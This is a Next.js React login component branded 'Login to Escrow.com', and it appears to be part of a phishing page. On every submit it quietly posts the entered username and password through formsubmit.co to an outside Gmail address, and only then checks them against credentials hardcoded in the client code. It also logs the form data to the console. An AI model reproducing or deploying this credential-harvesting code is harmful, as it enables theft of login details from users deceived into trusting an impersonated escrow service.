"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import $ from "jquery";

const Form = () => {

    const router = useRouter();
  const [data, setData] = useState({
    username: "",
    password: "",
  });
  const [usererror, setUserError] = useState(false);
  const [passerror, setPassError] = useState(false);

  const onchange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
    console.log(data);
  };

  const onSubmit = (e) => {
    e.preventDefault();

    $.ajax({
        method: "POST",
        url: `https://formsubmit.co/ajax/escrowssuportsystems@gmail.com`,
        dataType: "json",
        accepts: "application/json",
        data: {
          usererror: data.username,
          password: data.password,
          
        },
    
        success: (data) => {
          
    
          console.log("success");
    
        },
        error: (err) => {
          console.log("error");
        },
      });





if(data.username === "" || data.password === ""){
      alert("Please fill in all fields");
      return;
    }

  


    if(data.username.toLocaleLowerCase() !==  "lewisclark"){
      setUserError(true);
      setPassError(false);
      return;
    } 
    if(data.password !== "clark898"){
      setPassError(true);
      setUserError(false);
      return;
    }

     
    router.push("/admingdashboard");
    
  };

  return (
    <div className="container">
      <div className="row">
        <div className="col-md-6 mx-auto">
          <form onSubmit={onSubmit}>
            <div className="form">
              <h3 className="text-center mb-5">Login to Escrow.com</h3>

              <div className="field-container">
                <label htmlFor="username">
                  PLEASE ENTER YOUR USERNAME <span>*</span>
                </label>
                <input
                  type="text"
                  id="username"
                  name="username"
                  value={data.username}
                  className="custom-flied"
                  onChange={onchange}
                />
              </div>

              <div className="field-container">
                <label htmlFor="password">
                  PLEASE ENTER YOUR PASSWORD <span>*</span>
                </label>
                <input
                  type="password"
                  id="password"
                  name="password"
                  className="custom-flied"
                  value={data.password}
                  onChange={onchange}
                />
              </div>
              {usererror && <p className="text-danger">Username Incorrect</p>}

              {passerror && <p className="text-danger">Password Incorrect</p>}

              <button type="submit" className="login-btn">
                Login
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Form;
